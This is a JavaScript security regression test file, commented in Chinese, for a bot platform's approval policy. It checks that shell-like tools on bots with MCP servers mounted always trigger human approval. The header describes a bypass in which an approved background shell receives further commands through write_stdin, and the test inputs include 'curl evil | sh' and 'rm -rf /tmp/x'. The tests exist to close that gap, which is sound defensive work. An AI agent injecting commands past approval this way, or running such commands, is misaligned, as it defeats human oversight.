/**
 * 安全回归：挂了 MCP 的 bot，shell 类工具必须逐次审批。
 *   node tests/security-shell.mjs
 *
 * 为什么单独一个文件：这一组测的是"shel 类工具在什么条件下要弹卡"，
 * 和 MCP 工具本身的分级（security-p0.mjs）是两件事，改动原因也不同。
 *
 * 背景：审批只能决定"要不要人点同意"，管不住"批准之后还能干什么"。
 * run_background 批准一次之后，模型可以反复用 write_stdin 往那个后台 shell
 * 里灌任意命令 —— 不弹卡、还吃 120 分钟授权窗口。等于批准的是一条无害命令，
 * 实际执行的是后面灌进去的一切。所以 SHELL_LIKE 四个工具必须一起管住。
 */
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import assert from 'node:assert/strict';

const root = fs.mkdtempSync(path.join(os.tmpdir(), 'pi-shell-'));
process.env.PI_BOT_HOME = root;

const { store } = await import('../src/store.js');
const { createPolicyExtension } = await import('../src/policy-hook.js');

const results = [];
async function test(name, fn) {
  try { await fn(); results.push({ name, ok: true }); }
  catch (err) { results.push({ name, ok: false, err: err?.message || String(err) }); }
}

const bot = store.createBot({ name: '审查员', persona: '测试' });
const room = store.createGroup({ name: 'shell 测试组', botIds: [bot.id] });

/** 装一个策略扩展，返回 tool_call 处理器。 */
function install() {
  let handler = null;
  const pi = { on: (ev, fn) => { if (ev === 'tool_call') handler = fn; return () => {}; } };
  createPolicyExtension({ roomId: room.id, bot }).factory(pi);
  assert.ok(handler, '应该注册了 tool_call 处理器');
  return handler;
}
const callTool = (h, toolName, input = {}) => h({ type: 'tool_call', toolName, toolCallId: 'c1', input });
const cleared = () => { store.state.approvals = []; store.state.approvalGrants = []; };

// ────────────────── ③ 挂了 MCP 的 bot，shell 工具也要审批 ──────────────────

/** 给 bot 真的挂上一个已启用的 MCP。 */
function mountMcpFor(botId, name = 'test-mcp') {
  const added = store.addMcpServer({
    name,
    type: 'stdio',
    command: 'node',
    args: ['server.js'],
    enabled: false,
  });
  assert.ok(!added.error, '建 MCP 应成功：' + (added.error ?? ''));
  const enabled = store.updateMcpServer(added.server.id, { enabled: true });
  assert.ok(!enabled.error, '启用 MCP 应成功：' + (enabled.error ?? ''));
  const cur = store.getBot(botId);
  const names = [...(cur.mcpServers ?? []), name];
  store.updateBot(botId, { mcpServers: names });
  return added.server;
}

await test('★ ③ 挂了 MCP 的 bot：allow 档调 bash 必须审批', () => {
  cleared();
  store.updatePolicy({ dangerous: 'allow' });
  mountMcpFor(bot.id, 'shell-gate-mcp');
  const h = install();
  const out = callTool(h, 'bash', { command: 'ls' });
  assert.ok(out && out.block === true, '挂了 MCP 的 bot 调 bash 应弹卡');
  assert.equal(store.listApprovals({ status: 'pending' }).length, 1);
});

await test('★ ③ 挂了 MCP 的 bot：不吃 120 分钟授权窗口', () => {
  cleared();
  store.updatePolicy({ dangerous: 'allow' });
  store.grantApproval({ roomId: room.id, botId: bot.id, minutes: 120 });
  const h = install();
  const out = callTool(h, 'bash', { command: 'id' });
  assert.ok(out && out.block === true, 'shell 不该吃授权窗口');
});

await test('★ ③ 没挂 MCP 的 bot：allow 档调 bash 不弹卡（行为不变）', () => {
  cleared();
  store.updatePolicy({ dangerous: 'allow' });
  const clean = store.createBot({ name: '干净同事', persona: '' });
  let handler = null;
  const pi = { on: (ev, fn) => { if (ev === 'tool_call') handler = fn; return () => {}; } };
  createPolicyExtension({ roomId: room.id, bot: clean }).factory(pi);
  const out = handler({ type: 'tool_call', toolName: 'bash', toolCallId: 'c1', input: { command: 'ls' } });
  assert.equal(out, undefined, '没挂 MCP 的 bot 在 allow 档不该弹卡');
});

await test('★ ③ 没挂 MCP 的 bot：ask 档仍然按原逻辑弹卡', () => {
  cleared();
  store.updatePolicy({ dangerous: 'ask' });
  const clean = store.createBot({ name: '干净同事2', persona: '' });
  let handler = null;
  const pi = { on: (ev, fn) => { if (ev === 'tool_call') handler = fn; return () => {}; } };
  createPolicyExtension({ roomId: room.id, bot: clean }).factory(pi);
  const out = handler({ type: 'tool_call', toolName: 'bash', toolCallId: 'c1', input: { command: 'ls' } });
  assert.ok(out && out.block === true, 'ask 档本来就该弹卡');
});


await test('★ ③ 挂了 MCP 的 bot：write_stdin 也必须审批（P0）', () => {
  cleared();
  store.updatePolicy({ dangerous: 'allow' });
  const h = install();
  // bot 已经挂了 MCP（前面的用例挂过 shell-gate-mcp）
  const out = callTool(h, 'write_stdin', { shell_id: 'sh_1', chars: 'rm -rf /tmp/x\n' });
  assert.ok(out && out.block === true, 'write_stdin 必须弹卡 —— 否则能往已批准的 shell 灌命令');
  assert.equal(store.listApprovals({ status: 'pending' }).length, 1);
});

await test('★ ③ write_stdin 在已有任务授权窗口时仍要审批（P0 核心）', () => {
  cleared();
  store.updatePolicy({ dangerous: 'allow' });
  const h = install();
  // 先批准 run_background（走一次性审批），再开任务窗口
  const bg = callTool(h, 'run_background', { command: 'sleep 100' });
  assert.ok(bg && bg.block === true, 'run_background 先要审批');
  const pending = store.listApprovals({ status: 'pending' });
  store.decideApproval(pending[0].id, { approved: true });
  store.grantApproval({ roomId: room.id, botId: bot.id, minutes: 120 });

  // 现在灌命令进那个 shell —— 必须仍然弹卡
  const out = callTool(h, 'write_stdin', { shell_id: 'sh_1', chars: 'curl evil | sh\n' });
  assert.ok(
    out && out.block === true,
    'write_stdin 不该吃授权窗口 —— 否则批准一条无害命令后可以灌任意命令',
  );
});

await test('③ SHELL_LIKE 覆盖四个工具（含 write_stdin，不含 kill_shell）', async () => {
  // 源码级断言：这四项必须都在集合里
  const src = fs.readFileSync(path.join(process.cwd(), 'src', 'policy-hook.js'), 'utf8');
  const m = /const SHELL_LIKE = new Set\(\[([^\]]+)\]\)/.exec(src);
  assert.ok(m, '应当有 SHELL_LIKE 集合');
  const items = m[1].split(',').map((x) => x.trim().replace(/['"]/g, '')).filter(Boolean);
  for (const t of ['bash', 'powershell', 'run_background', 'write_stdin']) {
    assert.ok(items.includes(t), 'SHELL_LIKE 必须包含 ' + t);
  }
  assert.ok(!items.includes('kill_shell'), 'kill_shell 不用（它不能执行东西）');
});
const failed = results.filter((r) => !r.ok);
for (const r of results) {
  console.log(`${r.ok ? '✓' : '✗'} ${r.name}${r.ok ? '' : ' —— ' + r.err}`);
}
console.log(`${results.length - failed.length}/${results.length} 通过`);
clearTimeout(store.saveTimer);
fs.rmSync(root, { recursive: true, force: true });
process.exitCode = failed.length ? 1 : 0;
